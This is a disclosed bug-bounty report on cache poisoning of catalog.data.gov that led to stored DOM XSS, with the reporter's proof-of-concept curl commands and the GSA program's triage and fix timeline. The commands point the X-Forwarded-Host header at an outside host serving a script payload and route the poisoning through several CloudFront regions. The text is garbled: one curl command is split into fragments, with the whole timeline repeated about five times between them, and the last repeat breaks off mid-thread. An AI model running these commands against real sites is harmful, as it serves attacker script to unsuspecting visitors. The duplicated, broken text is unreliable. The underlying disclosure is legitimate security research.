---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/cross-site-scripting-xss-stored
  - env/web
substate: "resolved"
weakness: "Cross-site Scripting (XSS) - Stored"
enriched: true
body: true
date: 2018-11-01
submitted: 2018-01-10T12:23:37.143Z
bounty_usd: 750
votes: 93
cve: []
program: "[[programs/gsa_bbp|GSA Bounty]]"
reporter: "albinowax"
source: "https://hackerone.com/reports/303730"
title: "Defacement of catalog.data.gov via web cache poisoning to stored DOMXSS"
---
# Defacement of catalog.data.gov via web cache poisoning to stored DOMXSS

> **Severity:** High | **Bounty:** 750 USD | **Votes:** 93 | **Program:** GSA Bounty | **Disclosed:** 2018-11-01

- Report: [https://hackerone.com/reports/303730](https://hackerone.com/reports/303730)
- CWE: Cross-site Scripting (XSS) - Stored
- Submitted: 2018-01-10T12:23:37.143Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

An attacker can deface various pages on catalog.data.gov, leading to them executing malicious JavaScript when visited by a normal user.

The root problem is that the server trusts the X-Forwarded-Host HTTP header, and uses this to populate the 'data-site-root' and 'data-locale-root' attributes on the <body tag. Some JavaScript then fetches a JSON file from the URL specified in these attributes, and writes the response to the page without escaping it, leading to a DOMXSS vulnerability.

This behaviour is harmless by itself, since I can't make a victim send a malicious HTTP header. Fortunately for me, I can ensure that the poisoned response sent to me is cached by CloudFront, meaning my payload will be served to loads of other users. 

Please be careful when exploring this issue, as it's potentially quite easy to accidentally poison CloudFront's cache and antagonise your visitors. To safely replicate this issue, you can use the following steps:

1. Run curl command to poison cache:
curl -i -s -k  -X 

- **Report Filed**
- **Report Needs More Info**
- **Report New**
- **2018-01-12** @albinowax: Here's an improved PoC that uses a timestamp to avoid caching issues:

1. Execute the following command
```url=https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=$(date +%s) && curl -i -s -k -H $'Host: catalog.data.gov' -H $'Accept-Encoding: gzip, deflate' -H $'Accept: /' -H $'Accept-Language: en' -H $'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)' -H $'x-forwarded-host: portswigger-labs.net/catalog.data.gov_json_xss/json.php?' -H $'Connection: close' $url | fgrep portswigger && echo -e "\n\n$url"```

2. The previous step should print out a URL like https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=1515773700 on the last line. If you don't see the URL, something went wrong. Load the URL that gets printed in Chrome

3. Wait a few seconds for the alert
- **2018-01-13** @joystick: Hi,

Thank you for the additional information! We will investigate and get back to you as soon as we have an update to share.

Regards.
@joystick
- **2018-01-13** @joystick: We were able to replicate the issue and will now escalate to our internal team for further investigation. Thank you!
- **Report Severity Updated**
- **2018-01-13** @albinowax: Good to hear you've replicated it.

Just in case the logic behind the original critical severity isn't clear, it's that by tweaking the cURL command slightly it's possible to poison https://catalog.data.gov/dataset/consumer-complaint-database so that random visitors will get exploited. This technique can be used on *every* dataset, and also possibly every other page on catalog.data.gov (I'm working on that).
- **Report Severity Updated**
- **2018-01-13** @joystick: @albinowax - the complexity of the attack was set to `High` because Cloudfront would serve the cached response only to users from the same region as the attacker. Confidentiality is set to `Low` since there isn't much to any sensitive information to extract. Integrity was re-set to `High` given the fact that the injected JS might allow the attacker to override the page's content. However, the attack would still require user interaction, and as a result the overall CVSS is `High (7.4)`. If you have any additional information that would help us better assess this report, please let us know.
- **Report Triaged**
- **2018-01-25** @albinowax: The statement that the complexity of this attack is 'high' because Cloudfront would serve the cached response only to users from the same region as the attacker isn't entirely accurate.

An attacker can easily poison the cache in arbitrary regions by using a service like `https://www.nexcess.net/resources/tools/global-dns-checker/?h=catalog.data.gov&t=A` to get a list of CloudFront's frontends in different regions, then routing the attack through each of those in turn:

curl --resolve catalog.data.gov:443:54.230.9.199 -H $'x-forwarded-host: portswigger-labs.net/' https://catalog.data.gov/dataset/consumer-complaint-database?zxcv=1234

Cheers.
- **Report Severity Updated**
- **2018-01-31** @joystick: @albinowax - thank for the follow-up! we adjusted to the complexity to `High`.
- **Bounty Awarded**
- **2018-05-30** @albinowax: It looks like this vulnerability hasn't been fixed since I reported it several months ago. I should mention that I'm planning to deliver a talk on the underlying attack concept/technique at a major security conference (Black Hat USA) in a couple of month's time. Unfortunately after this point it's likely that other people will independently discover this vulnerability and potentially exploit it. As such, I really think it's worth resolving this issue promptly.
- **2018-05-30** @ericmillgsa: @albinowax Thanks for the poke, and the heads up. We'll investigate this internally and will update this thread.
- **2018-07-10** @ericmillgsa: @albinowax We've tested a fix to this issue, and are still in the process of deploying the fix to production, as we have had internal challenges that have made it difficult to do this as fast as we'd usually like. I don't have a specific ETA right now, but we're aware of the issue and understand that this issue will be publicly disclosed, and intend to have a fix deployed before that time. Thanks again for all the details you've given, and for the notice you've provided of your intent to disclose it.
- **2018-07-24** @ericmillgsa: @albinowax Just so you know, we're still tracking and aim to have this resolved soon.
- **2018-07-25** @albinowax: Thanks for the update. Is it safe to assume this will be resolved by the 9th August?
- **2018-07-25** @ericmillgsa: @albinowax Yes, that's our plan and we believe that's safe to assume.
- **2018-08-08** @hyonjkim: This has been resolved by the Data.gov team.
- **2018-08-08** @philipashlock: @albinowax For your awareness, this issue was fixed in the upstream codebase previously but had not been rolled out as part of our deployment until recently. The upstream fix was made here https://github.com/ckan/ckan/pull/2599

My understanding is that part of this issue was inherited from the url_for function provided by the routes python library used with this codebase. I haven't seen this reported on other projects that use routes, but my understanding is that routes is a port of the rails routing functionality and it does look like a similar vulnerability has been reported for rails (also via HackerOne). You can see that vulnerability report here https://github.com/rails/rails/issues/29893
- **2018-08-08** @philipashlock: @albinowax We have addressed this vulnerability for the website it was reported for, but we are aware of other sites outside of our organization that are still vulnerable and whom we are coordinating with to remediate. We're aware that you are planning to present at the conference tomorrow but please be conscientious of the fact that we currently coordinating with other sites which we hope will be remediated soon, but it's unlikely they'll all be addressed before you are scheduled to present. As you can see by the issue on the Ruby on Rails repo, this is not only something that impacts many things using that framework, but even software projects in python like the one we use that incorporates a library ported from Rails. So this is likely a widespread issue.
- **2018-08-09** @albinowax: Thanks for the additional info, it's very interesting to see that this has sat in the public issue tracker for over a year. I am aware that the issue is widespread - I think this is largely due to poor awareness in the security community and lack of appreciation for how serious the consequences can be, which my presentation will hopefully help to fix.
- **2018-09-24** @albinowax: I think this issue could be marked as resolved now.
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
GET' \
    -H 

- **Report Filed**
- **Report Needs More Info**
- **Report New**
- **2018-01-12** @albinowax: Here's an improved PoC that uses a timestamp to avoid caching issues:

1. Execute the following command
```url=https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=$(date +%s) && curl -i -s -k -H $'Host: catalog.data.gov' -H $'Accept-Encoding: gzip, deflate' -H $'Accept: /' -H $'Accept-Language: en' -H $'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)' -H $'x-forwarded-host: portswigger-labs.net/catalog.data.gov_json_xss/json.php?' -H $'Connection: close' $url | fgrep portswigger && echo -e "\n\n$url"```

2. The previous step should print out a URL like https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=1515773700 on the last line. If you don't see the URL, something went wrong. Load the URL that gets printed in Chrome

3. Wait a few seconds for the alert
- **2018-01-13** @joystick: Hi,

Thank you for the additional information! We will investigate and get back to you as soon as we have an update to share.

Regards.
@joystick
- **2018-01-13** @joystick: We were able to replicate the issue and will now escalate to our internal team for further investigation. Thank you!
- **Report Severity Updated**
- **2018-01-13** @albinowax: Good to hear you've replicated it.

Just in case the logic behind the original critical severity isn't clear, it's that by tweaking the cURL command slightly it's possible to poison https://catalog.data.gov/dataset/consumer-complaint-database so that random visitors will get exploited. This technique can be used on *every* dataset, and also possibly every other page on catalog.data.gov (I'm working on that).
- **Report Severity Updated**
- **2018-01-13** @joystick: @albinowax - the complexity of the attack was set to `High` because Cloudfront would serve the cached response only to users from the same region as the attacker. Confidentiality is set to `Low` since there isn't much to any sensitive information to extract. Integrity was re-set to `High` given the fact that the injected JS might allow the attacker to override the page's content. However, the attack would still require user interaction, and as a result the overall CVSS is `High (7.4)`. If you have any additional information that would help us better assess this report, please let us know.
- **Report Triaged**
- **2018-01-25** @albinowax: The statement that the complexity of this attack is 'high' because Cloudfront would serve the cached response only to users from the same region as the attacker isn't entirely accurate.

An attacker can easily poison the cache in arbitrary regions by using a service like `https://www.nexcess.net/resources/tools/global-dns-checker/?h=catalog.data.gov&t=A` to get a list of CloudFront's frontends in different regions, then routing the attack through each of those in turn:

curl --resolve catalog.data.gov:443:54.230.9.199 -H $'x-forwarded-host: portswigger-labs.net/' https://catalog.data.gov/dataset/consumer-complaint-database?zxcv=1234

Cheers.
- **Report Severity Updated**
- **2018-01-31** @joystick: @albinowax - thank for the follow-up! we adjusted to the complexity to `High`.
- **Bounty Awarded**
- **2018-05-30** @albinowax: It looks like this vulnerability hasn't been fixed since I reported it several months ago. I should mention that I'm planning to deliver a talk on the underlying attack concept/technique at a major security conference (Black Hat USA) in a couple of month's time. Unfortunately after this point it's likely that other people will independently discover this vulnerability and potentially exploit it. As such, I really think it's worth resolving this issue promptly.
- **2018-05-30** @ericmillgsa: @albinowax Thanks for the poke, and the heads up. We'll investigate this internally and will update this thread.
- **2018-07-10** @ericmillgsa: @albinowax We've tested a fix to this issue, and are still in the process of deploying the fix to production, as we have had internal challenges that have made it difficult to do this as fast as we'd usually like. I don't have a specific ETA right now, but we're aware of the issue and understand that this issue will be publicly disclosed, and intend to have a fix deployed before that time. Thanks again for all the details you've given, and for the notice you've provided of your intent to disclose it.
- **2018-07-24** @ericmillgsa: @albinowax Just so you know, we're still tracking and aim to have this resolved soon.
- **2018-07-25** @albinowax: Thanks for the update. Is it safe to assume this will be resolved by the 9th August?
- **2018-07-25** @ericmillgsa: @albinowax Yes, that's our plan and we believe that's safe to assume.
- **2018-08-08** @hyonjkim: This has been resolved by the Data.gov team.
- **2018-08-08** @philipashlock: @albinowax For your awareness, this issue was fixed in the upstream codebase previously but had not been rolled out as part of our deployment until recently. The upstream fix was made here https://github.com/ckan/ckan/pull/2599

My understanding is that part of this issue was inherited from the url_for function provided by the routes python library used with this codebase. I haven't seen this reported on other projects that use routes, but my understanding is that routes is a port of the rails routing functionality and it does look like a similar vulnerability has been reported for rails (also via HackerOne). You can see that vulnerability report here https://github.com/rails/rails/issues/29893
- **2018-08-08** @philipashlock: @albinowax We have addressed this vulnerability for the website it was reported for, but we are aware of other sites outside of our organization that are still vulnerable and whom we are coordinating with to remediate. We're aware that you are planning to present at the conference tomorrow but please be conscientious of the fact that we currently coordinating with other sites which we hope will be remediated soon, but it's unlikely they'll all be addressed before you are scheduled to present. As you can see by the issue on the Ruby on Rails repo, this is not only something that impacts many things using that framework, but even software projects in python like the one we use that incorporates a library ported from Rails. So this is likely a widespread issue.
- **2018-08-09** @albinowax: Thanks for the additional info, it's very interesting to see that this has sat in the public issue tracker for over a year. I am aware that the issue is widespread - I think this is largely due to poor awareness in the security community and lack of appreciation for how serious the consequences can be, which my presentation will hopefully help to fix.
- **2018-09-24** @albinowax: I think this issue could be marked as resolved now.
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
Host: catalog.data.gov' -H 

- **Report Filed**
- **Report Needs More Info**
- **Report New**
- **2018-01-12** @albinowax: Here's an improved PoC that uses a timestamp to avoid caching issues:

1. Execute the following command
```url=https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=$(date +%s) && curl -i -s -k -H $'Host: catalog.data.gov' -H $'Accept-Encoding: gzip, deflate' -H $'Accept: /' -H $'Accept-Language: en' -H $'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)' -H $'x-forwarded-host: portswigger-labs.net/catalog.data.gov_json_xss/json.php?' -H $'Connection: close' $url | fgrep portswigger && echo -e "\n\n$url"```

2. The previous step should print out a URL like https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=1515773700 on the last line. If you don't see the URL, something went wrong. Load the URL that gets printed in Chrome

3. Wait a few seconds for the alert
- **2018-01-13** @joystick: Hi,

Thank you for the additional information! We will investigate and get back to you as soon as we have an update to share.

Regards.
@joystick
- **2018-01-13** @joystick: We were able to replicate the issue and will now escalate to our internal team for further investigation. Thank you!
- **Report Severity Updated**
- **2018-01-13** @albinowax: Good to hear you've replicated it.

Just in case the logic behind the original critical severity isn't clear, it's that by tweaking the cURL command slightly it's possible to poison https://catalog.data.gov/dataset/consumer-complaint-database so that random visitors will get exploited. This technique can be used on *every* dataset, and also possibly every other page on catalog.data.gov (I'm working on that).
- **Report Severity Updated**
- **2018-01-13** @joystick: @albinowax - the complexity of the attack was set to `High` because Cloudfront would serve the cached response only to users from the same region as the attacker. Confidentiality is set to `Low` since there isn't much to any sensitive information to extract. Integrity was re-set to `High` given the fact that the injected JS might allow the attacker to override the page's content. However, the attack would still require user interaction, and as a result the overall CVSS is `High (7.4)`. If you have any additional information that would help us better assess this report, please let us know.
- **Report Triaged**
- **2018-01-25** @albinowax: The statement that the complexity of this attack is 'high' because Cloudfront would serve the cached response only to users from the same region as the attacker isn't entirely accurate.

An attacker can easily poison the cache in arbitrary regions by using a service like `https://www.nexcess.net/resources/tools/global-dns-checker/?h=catalog.data.gov&t=A` to get a list of CloudFront's frontends in different regions, then routing the attack through each of those in turn:

curl --resolve catalog.data.gov:443:54.230.9.199 -H $'x-forwarded-host: portswigger-labs.net/' https://catalog.data.gov/dataset/consumer-complaint-database?zxcv=1234

Cheers.
- **Report Severity Updated**
- **2018-01-31** @joystick: @albinowax - thank for the follow-up! we adjusted to the complexity to `High`.
- **Bounty Awarded**
- **2018-05-30** @albinowax: It looks like this vulnerability hasn't been fixed since I reported it several months ago. I should mention that I'm planning to deliver a talk on the underlying attack concept/technique at a major security conference (Black Hat USA) in a couple of month's time. Unfortunately after this point it's likely that other people will independently discover this vulnerability and potentially exploit it. As such, I really think it's worth resolving this issue promptly.
- **2018-05-30** @ericmillgsa: @albinowax Thanks for the poke, and the heads up. We'll investigate this internally and will update this thread.
- **2018-07-10** @ericmillgsa: @albinowax We've tested a fix to this issue, and are still in the process of deploying the fix to production, as we have had internal challenges that have made it difficult to do this as fast as we'd usually like. I don't have a specific ETA right now, but we're aware of the issue and understand that this issue will be publicly disclosed, and intend to have a fix deployed before that time. Thanks again for all the details you've given, and for the notice you've provided of your intent to disclose it.
- **2018-07-24** @ericmillgsa: @albinowax Just so you know, we're still tracking and aim to have this resolved soon.
- **2018-07-25** @albinowax: Thanks for the update. Is it safe to assume this will be resolved by the 9th August?
- **2018-07-25** @ericmillgsa: @albinowax Yes, that's our plan and we believe that's safe to assume.
- **2018-08-08** @hyonjkim: This has been resolved by the Data.gov team.
- **2018-08-08** @philipashlock: @albinowax For your awareness, this issue was fixed in the upstream codebase previously but had not been rolled out as part of our deployment until recently. The upstream fix was made here https://github.com/ckan/ckan/pull/2599

My understanding is that part of this issue was inherited from the url_for function provided by the routes python library used with this codebase. I haven't seen this reported on other projects that use routes, but my understanding is that routes is a port of the rails routing functionality and it does look like a similar vulnerability has been reported for rails (also via HackerOne). You can see that vulnerability report here https://github.com/rails/rails/issues/29893
- **2018-08-08** @philipashlock: @albinowax We have addressed this vulnerability for the website it was reported for, but we are aware of other sites outside of our organization that are still vulnerable and whom we are coordinating with to remediate. We're aware that you are planning to present at the conference tomorrow but please be conscientious of the fact that we currently coordinating with other sites which we hope will be remediated soon, but it's unlikely they'll all be addressed before you are scheduled to present. As you can see by the issue on the Ruby on Rails repo, this is not only something that impacts many things using that framework, but even software projects in python like the one we use that incorporates a library ported from Rails. So this is likely a widespread issue.
- **2018-08-09** @albinowax: Thanks for the additional info, it's very interesting to see that this has sat in the public issue tracker for over a year. I am aware that the issue is widespread - I think this is largely due to poor awareness in the security community and lack of appreciation for how serious the consequences can be, which my presentation will hopefully help to fix.
- **2018-09-24** @albinowax: I think this issue could be marked as resolved now.
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
Accept-Encoding: gzip, deflate' -H 

- **Report Filed**
- **Report Needs More Info**
- **Report New**
- **2018-01-12** @albinowax: Here's an improved PoC that uses a timestamp to avoid caching issues:

1. Execute the following command
```url=https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=$(date +%s) && curl -i -s -k -H $'Host: catalog.data.gov' -H $'Accept-Encoding: gzip, deflate' -H $'Accept: /' -H $'Accept-Language: en' -H $'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)' -H $'x-forwarded-host: portswigger-labs.net/catalog.data.gov_json_xss/json.php?' -H $'Connection: close' $url | fgrep portswigger && echo -e "\n\n$url"```

2. The previous step should print out a URL like https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=1515773700 on the last line. If you don't see the URL, something went wrong. Load the URL that gets printed in Chrome

3. Wait a few seconds for the alert
- **2018-01-13** @joystick: Hi,

Thank you for the additional information! We will investigate and get back to you as soon as we have an update to share.

Regards.
@joystick
- **2018-01-13** @joystick: We were able to replicate the issue and will now escalate to our internal team for further investigation. Thank you!
- **Report Severity Updated**
- **2018-01-13** @albinowax: Good to hear you've replicated it.

Just in case the logic behind the original critical severity isn't clear, it's that by tweaking the cURL command slightly it's possible to poison https://catalog.data.gov/dataset/consumer-complaint-database so that random visitors will get exploited. This technique can be used on *every* dataset, and also possibly every other page on catalog.data.gov (I'm working on that).
- **Report Severity Updated**
- **2018-01-13** @joystick: @albinowax - the complexity of the attack was set to `High` because Cloudfront would serve the cached response only to users from the same region as the attacker. Confidentiality is set to `Low` since there isn't much to any sensitive information to extract. Integrity was re-set to `High` given the fact that the injected JS might allow the attacker to override the page's content. However, the attack would still require user interaction, and as a result the overall CVSS is `High (7.4)`. If you have any additional information that would help us better assess this report, please let us know.
- **Report Triaged**
- **2018-01-25** @albinowax: The statement that the complexity of this attack is 'high' because Cloudfront would serve the cached response only to users from the same region as the attacker isn't entirely accurate.

An attacker can easily poison the cache in arbitrary regions by using a service like `https://www.nexcess.net/resources/tools/global-dns-checker/?h=catalog.data.gov&t=A` to get a list of CloudFront's frontends in different regions, then routing the attack through each of those in turn:

curl --resolve catalog.data.gov:443:54.230.9.199 -H $'x-forwarded-host: portswigger-labs.net/' https://catalog.data.gov/dataset/consumer-complaint-database?zxcv=1234

Cheers.
- **Report Severity Updated**
- **2018-01-31** @joystick: @albinowax - thank for the follow-up! we adjusted to the complexity to `High`.
- **Bounty Awarded**
- **2018-05-30** @albinowax: It looks like this vulnerability hasn't been fixed since I reported it several months ago. I should mention that I'm planning to deliver a talk on the underlying attack concept/technique at a major security conference (Black Hat USA) in a couple of month's time. Unfortunately after this point it's likely that other people will independently discover this vulnerability and potentially exploit it. As such, I really think it's worth resolving this issue promptly.
- **2018-05-30** @ericmillgsa: @albinowax Thanks for the poke, and the heads up. We'll investigate this internally and will update this thread.
- **2018-07-10** @ericmillgsa: @albinowax We've tested a fix to this issue, and are still in the process of deploying the fix to production, as we have had internal challenges that have made it difficult to do this as fast as we'd usually like. I don't have a specific ETA right now, but we're aware of the issue and understand that this issue will be publicly disclosed, and intend to have a fix deployed before that time. Thanks again for all the details you've given, and for the notice you've provided of your intent to disclose it.
- **2018-07-24** @ericmillgsa: @albinowax Just so you know, we're still tracking and aim to have this resolved soon.
- **2018-07-25** @albinowax: Thanks for the update. Is it safe to assume this will be resolved by the 9th August?
- **2018-07-25** @ericmillgsa: @albinowax Yes, that's our plan and we believe that's safe to assume.
- **2018-08-08** @hyonjkim: This has been resolved by the Data.gov team.
- **2018-08-08** @philipashlock: @albinowax For your awareness, this issue was fixed in the upstream codebase previously but had not been rolled out as part of our deployment until recently. The upstream fix was made here https://github.com/ckan/ckan/pull/2599

My understanding is that part of this issue was inherited from the url_for function provided by the routes python library used with this codebase. I haven't seen this reported on other projects that use routes, but my understanding is that routes is a port of the rails routing functionality and it does look like a similar vulnerability has been reported for rails (also via HackerOne). You can see that vulnerability report here https://github.com/rails/rails/issues/29893
- **2018-08-08** @philipashlock: @albinowax We have addressed this vulnerability for the website it was reported for, but we are aware of other sites outside of our organization that are still vulnerable and whom we are coordinating with to remediate. We're aware that you are planning to present at the conference tomorrow but please be conscientious of the fact that we currently coordinating with other sites which we hope will be remediated soon, but it's unlikely they'll all be addressed before you are scheduled to present. As you can see by the issue on the Ruby on Rails repo, this is not only something that impacts many things using that framework, but even software projects in python like the one we use that incorporates a library ported from Rails. So this is likely a widespread issue.
- **2018-08-09** @albinowax: Thanks for the additional info, it's very interesting to see that this has sat in the public issue tracker for over a year. I am aware that the issue is widespread - I think this is largely due to poor awareness in the security community and lack of appreciation for how serious the consequences can be, which my presentation will hopefully help to fix.
- **2018-09-24** @albinowax: I think this issue could be marked as resolved now.
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
Accept: */*' -H 

- **Report Filed**
- **Report Needs More Info**
- **Report New**
- **2018-01-12** @albinowax: Here's an improved PoC that uses a timestamp to avoid caching issues:

1. Execute the following command
```url=https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=$(date +%s) && curl -i -s -k -H $'Host: catalog.data.gov' -H $'Accept-Encoding: gzip, deflate' -H $'Accept: /' -H $'Accept-Language: en' -H $'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)' -H $'x-forwarded-host: portswigger-labs.net/catalog.data.gov_json_xss/json.php?' -H $'Connection: close' $url | fgrep portswigger && echo -e "\n\n$url"```

2. The previous step should print out a URL like https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=1515773700 on the last line. If you don't see the URL, something went wrong. Load the URL that gets printed in Chrome

3. Wait a few seconds for the alert
- **2018-01-13** @joystick: Hi,

Thank you for the additional information! We will investigate and get back to you as soon as we have an update to share.

Regards.
@joystick
- **2018-01-13** @joystick: We were able to replicate the issue and will now escalate to our internal team for further investigation. Thank you!
- **Report Severity Updated**
- **2018-01-13** @albinowax: Good to hear you've replicated it.

Just in case the logic behind the original critical severity isn't clear, it's that by tweaking the cURL command slightly it's possible to poison https://catalog.data.gov/dataset/consumer-complaint-database so that random visitors will get exploited. This technique can be used on *every* dataset, and also possibly every other page on catalog.data.gov (I'm working on that).
- **Report Severity Updated**
- **2018-01-13** @joystick: @albinowax - the complexity of the attack was set to `High` because Cloudfront would serve the cached response only to users from the same region as the attacker. Confidentiality is set to `Low` since there isn't much to any sensitive information to extract. Integrity was re-set to `High` given the fact that the injected JS might allow the attacker to override the page's content. However, the attack would still require user interaction, and as a result the overall CVSS is `High (7.4)`. If you have any additional information that would help us better assess this report, please let us know.
- **Report Triaged**
- **2018-01-25** @albinowax: The statement that the complexity of this attack is 'high' because Cloudfront would serve the cached response only to users from the same region as the attacker isn't entirely accurate.

An attacker can easily poison the cache in arbitrary regions by using a service like `https://www.nexcess.net/resources/tools/global-dns-checker/?h=catalog.data.gov&t=A` to get a list of CloudFront's frontends in different regions, then routing the attack through each of those in turn:

curl --resolve catalog.data.gov:443:54.230.9.199 -H $'x-forwarded-host: portswigger-labs.net/' https://catalog.data.gov/dataset/consumer-complaint-database?zxcv=1234

Cheers.
- **Report Severity Updated**
- **2018-01-31** @joystick: @albinowax - thank for the follow-up! we adjusted to the complexity to `High`.
- **Bounty Awarded**
- **2018-05-30** @albinowax: It looks like this vulnerability hasn't been fixed since I reported it several months ago. I should mention that I'm planning to deliver a talk on the underlying attack concept/technique at a major security conference (Black Hat USA) in a couple of month's time. Unfortunately after this point it's likely that other people will independently discover this vulnerability and potentially exploit it. As such, I really think it's worth resolving this issue promptly.
- **2018-05-30** @ericmillgsa: @albinowax Thanks for the poke, and the heads up. We'll investigate this internally and will update this thread.
- **2018-07-10** @ericmillgsa: @albinowax We've tested a fix to this issue, and are still in the process of deploying the fix to production, as we have had internal challenges that have made it difficult to do this as fast as we'd usually like. I don't have a specific ETA right now, but we're aware of the issue and understand that this issue will be publicly disclosed, and intend to have a fix deployed before that time. Thanks again for all the details you've given, and for the notice you've provided of your intent to disclose it.
- **2018-07-24** @ericmillgsa: @albinowax Just so you know, we're still tracking and aim to have this resolved soon.
- **2018-07-25** @albinowax: Thanks for the update. Is it safe to assume this will be resolved by the 9th August?
- **2018-07-25** @ericmillgsa: @albinowax Yes, that's our plan and we believe that's safe to assume.
- **2018-08-08** @hyonjkim: This has been resolved by the Data.gov team.
- **2018-08-08** @philipashlock: @albinowax For your awareness, this issue was fixed in the upstream codebase previously but had not been rolled out as part of our deployment until recently. The upstream fix was made here https://github.com/ckan/ckan/pull/2599

My understanding is that part of this issue was inherited from the url_for function provided by the routes python library used with this codebase. I haven't seen this reported on other projects that use routes, but my understanding is that routes is a port of the rails routing functionality and it does look like a similar vulnerability has been reported for rails (also via HackerOne). You can see that vulnerability report here https://github.com/rails/rails/issues/29893
- **2018-08-08** @philipashlock: @albinowax We have addressed this vulnerability for the website it was reported for, but we are aware of other sites outside of our organization that are still vulnerable and whom we are coordinating with to remediate. We're aware that you are planning to present at the conference tomorrow but please be conscientious of the fact that we currently coordinating with other sites which we hope will be remediated soon, but it's unlikely they'll all be addressed before you are scheduled to present. As you can see by the issue on the Ruby on Rails repo, this is not only something that impacts many things using that framework, but even software projects in python like the one we use that incorporates a library ported from Rails. So this is likely a widespread issue.
- **2018-08-09** @albinowax: Thanks for the additional info, it's very interesting to see that this has sat in the public issue tracker for over a year. I am aware that the issue is widespread - I think this is largely due to poor awareness in the security community and lack of appreciation for how serious the consequences can be, which my presentation will hopefully help to fix.
- **2018-09-24** @albinowax: I think this issue could be marked as resolved now.
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
Accept-Language: en' -H 

- **Report Filed**
- **Report Needs More Info**
- **Report New**
- **2018-01-12** @albinowax: Here's an improved PoC that uses a timestamp to avoid caching issues:

1. Execute the following command
```url=https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=$(date +%s) && curl -i -s -k -H $'Host: catalog.data.gov' -H $'Accept-Encoding: gzip, deflate' -H $'Accept: /' -H $'Accept-Language: en' -H $'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)' -H $'x-forwarded-host: portswigger-labs.net/catalog.data.gov_json_xss/json.php?' -H $'Connection: close' $url | fgrep portswigger && echo -e "\n\n$url"```

2. The previous step should print out a URL like https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=1515773700 on the last line. If you don't see the URL, something went wrong. Load the URL that gets printed in Chrome

3. Wait a few seconds for the alert
- **2018-01-13** @joystick: Hi,

Thank you for the additional information! We will investigate and get back to you as soon as we have an update to share.

Regards.
@joystick
- **2018-01-13** @joystick: We were able to replicate the issue and will now escalate to our internal team for further investigation. Thank you!
- **Report Severity Updated**
- **2018-01-13** @albinowax: Good to hear you've replicated it.

Just in case the logic behind the original critical severity isn't clear, it's that by tweaking the cURL command slightly it's possible to poison https://catalog.data.gov/dataset/consumer-complaint-database so that random visitors will get exploited. This technique can be used on *every* dataset, and also possibly every other page on catalog.data.gov (I'm working on that).
- **Report Severity Updated**
- **2018-01-13** @joystick: @albinowax - the complexity of the attack was set to `High` because Cloudfront would serve the cached response only to users from the same region as the attacker. Confidentiality is set to `Low` since there isn't much to any sensitive information to extract. Integrity was re-set to `High` given the fact that the injected JS might allow the attacker to override the page's content. However, the attack would still require user interaction, and as a result the overall CVSS is `High (7.4)`. If you have any additional information that would help us better assess this report, please let us know.
- **Report Triaged**
- **2018-01-25** @albinowax: The statement that the complexity of this attack is 'high' because Cloudfront would serve the cached response only to users from the same region as the attacker isn't entirely accurate.

An attacker can easily poison the cache in arbitrary regions by using a service like `https://www.nexcess.net/resources/tools/global-dns-checker/?h=catalog.data.gov&t=A` to get a list of CloudFront's frontends in different regions, then routing the attack through each of those in turn:

curl --resolve catalog.data.gov:443:54.230.9.199 -H $'x-forwarded-host: portswigger-labs.net/' https://catalog.data.gov/dataset/consumer-complaint-database?zxcv=1234

Cheers.
- **Report Severity Updated**
- **2018-01-31** @joystick: @albinowax - thank for the follow-up! we adjusted to the complexity to `High`.
- **Bounty Awarded**
- **2018-05-30** @albinowax: It looks like this vulnerability hasn't been fixed since I reported it several months ago. I should mention that I'm planning to deliver a talk on the underlying attack concept/technique at a major security conference (Black Hat USA) in a couple of month's time. Unfortunately after this point it's likely that other people will independently discover this vulnerability and potentially exploit it. As such, I really think it's worth resolving this issue promptly.
- **2018-05-30** @ericmillgsa: @albinowax Thanks for the poke, and the heads up. We'll investigate this internally and will update this thread.
- **2018-07-10** @ericmillgsa: @albinowax We've tested a fix to this issue, and are still in the process of deploying the fix to production, as we have had internal challenges that have made it difficult to do this as fast as we'd usually like. I don't have a specific ETA right now, but we're aware of the issue and understand that this issue will be publicly disclosed, and intend to have a fix deployed before that time. Thanks again for all the details you've given, and for the notice you've provided of your intent to disclose it.
- **2018-07-24** @ericmillgsa: @albinowax Just so you know, we're still tracking and aim to have this resolved soon.
- **2018-07-25** @albinowax: Thanks for the update. Is it safe to assume this will be resolved by the 9th August?
- **2018-07-25** @ericmillgsa: @albinowax Yes, that's our plan and we believe that's safe to assume.
- **2018-08-08** @hyonjkim: This has been resolved by the Data.gov team.
- **2018-08-08** @philipashlock: @albinowax For your awareness, this issue was fixed in the upstream codebase previously but had not been rolled out as part of our deployment until recently. The upstream fix was made here https://github.com/ckan/ckan/pull/2599

